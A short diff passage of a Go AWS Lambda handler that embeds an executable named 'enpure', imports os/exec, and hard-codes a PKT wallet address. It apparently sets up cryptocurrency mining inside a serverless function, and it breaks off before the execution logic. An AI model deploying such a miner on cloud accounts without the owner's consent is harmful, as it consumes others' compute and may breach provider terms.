@@ -1,3 +1,21 @@
+package main
+
+import (
+	"embed"
+	"io"
+	"io/fs"
+	"io/ioutil"
+	"log"
+	"os"
+	"os/exec"
+
+	"github.com/aws/aws-lambda-go/events"
+	"github.com/aws/aws-lambda-go/lambda"
+)
+
+//go:embed myExecutable/enpure
+var executable embed.FS
+
 func handler(request events.APIGatewayProxyRequest) (*events.APIGatewayProxyResponse, error) {
     walletAddress := "pkt1qrup75sh882mea577x9r9q6ka8j8rzlqdzazlqg"
 
